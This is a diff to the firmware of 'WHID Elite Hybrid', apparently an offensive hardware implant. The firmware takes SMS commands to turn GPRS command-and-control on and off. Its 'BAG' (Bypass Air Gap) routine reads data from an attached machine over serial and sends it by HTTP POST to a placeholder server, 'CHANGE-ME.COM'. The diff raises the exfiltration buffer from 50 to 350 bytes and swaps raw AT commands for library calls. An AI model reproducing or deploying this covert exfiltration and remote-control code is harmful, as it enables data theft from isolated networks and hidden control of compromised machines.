@@ -1,5 +1,5 @@
 // ###################################################################################################
-// #                                      WHID Elite Hybrid 1.0.0                                  ###
+// #                                      WHID Elite Hybrid 1.0.1                                  ###
 // #                              Copyright 2018-2019 - @LucaBongiorni                             ###
 // #                              Fork 2020 HybridC2 - @JoelSernaMoreno                            ###
 // ###################################################################################################
@@ -25,7 +25,7 @@
 
 int dontSMS=0; // Set to 1 to save SMS
 int dontGPRS=0; // Set to 1 to use GPRS
-char gprsAirgap[50];
+char gprsAirgap[350];
 char fonaNotificationBuffer[64];
 char smsBuffer[150]; //Default 250. If changed, need also to change Line 615 accordingly.
  
@@ -244,17 +244,19 @@ void loop() {
         //##########################################################################################
         else if (strncmp(smsBuffer, "hybridC2:", 9) == 0) {
           delay(500);
-          fonaSerial->println("AT+SAPBR=3,1,\"CONTYPE\",\"GPRS\"");
-          delay(1000);
-          fonaSerial->println("AT+SAPBR=3,1,\"APN\",\"internet.digimobil.es\"");
-          delay(2000);
-          fonaSerial->println("AT+SAPBR=3,1,\"USER\",\"\"");
-          delay(1000);
-          fonaSerial->println("AT+SAPBR=3,1,\"PWD\",\"\"");
-          delay(1000);
-          fonaSerial->println("AT+SAPBR=1,1");
-          delay(2000);
-          fonaSerial->println("AT+SAPBR=2,1");
+          if (!fona.enableGPRS(true))
+            Serial.println(F("Failed to turn on GPRS"));
+//          fonaSerial->println("AT+SAPBR=3,1,\"CONTYPE\",\"GPRS\"");
+//          delay(1000);
+//          fonaSerial->println("AT+SAPBR=3,1,\"APN\",\"internet\"");
+//          delay(2000);
+//          fonaSerial->println("AT+SAPBR=3,1,\"USER\",\"\"");
+//          delay(1000);
+//          fonaSerial->println("AT+SAPBR=3,1,\"PWD\",\"\"");
+//          delay(1000);
+//          fonaSerial->println("AT+SAPBR=1,1");
+//          delay(2000);
+//          fonaSerial->println("AT+SAPBR=2,1");
           delay(500);
           fona.sendSMS(callerIDbuffer, "HybridC2 activated");
           dontGPRS=1;
@@ -265,11 +267,14 @@ void loop() {
         //# Disable hybrid C&C
         //##########################################################################################
         else if (strncmp(smsBuffer, "hybridC2off:", 12) == 0) {
-          fonaSerial->println("AT+CIPSHUT");
-          delay(1000);
-          fonaSerial->println("AT+SAPBR=0,1");
-          delay(1000);
-          fonaSerial->println("AT+CGATT=0");
+          if (!fona.enableGPRS(false))
+            Serial.println(F("Failed to turn off GPRS"));
+          delay(500);
+//          fonaSerial->println("AT+CIPSHUT");
+//          delay(1000);
+//          fonaSerial->println("AT+SAPBR=0,1");
+//          delay(1000);
+//          fonaSerial->println("AT+CGATT=0");
           dontSMS = 0;
           dontGPRS = 0;
           fona.sendSMS(callerIDbuffer, "HybridC2 disabled");
@@ -419,7 +424,7 @@ void loop() {
       
       if (dontGPRS == 1 && cmd == "BAG") {
         String BypassAirGap = Serial.readString();
-        BypassAirGap.toCharArray(gprsAirgap, 50);
+        BypassAirGap.toCharArray(gprsAirgap, 350);
         delay(500);
         int gprsAirgapSize = strlen(gprsAirgap);
         delay(1000);
@@ -427,7 +432,7 @@ void loop() {
         delay(1000);
         fonaSerial->println("AT+HTTPPARA=\"CID\",1");
         delay(2000);
-        fonaSerial->println("AT+HTTPPARA=\"URL\",\"URLYOURWEBSERVER.com\""); // example: whid.elite.com
+        fonaSerial->println("AT+HTTPPARA=\"URL\",\"CHANGE-ME.COM\""); // example: whid.elite.com
         delay(2000);
         fonaSerial->print("AT+HTTPDATA=");
         fonaSerial->print(gprsAirgapSize);
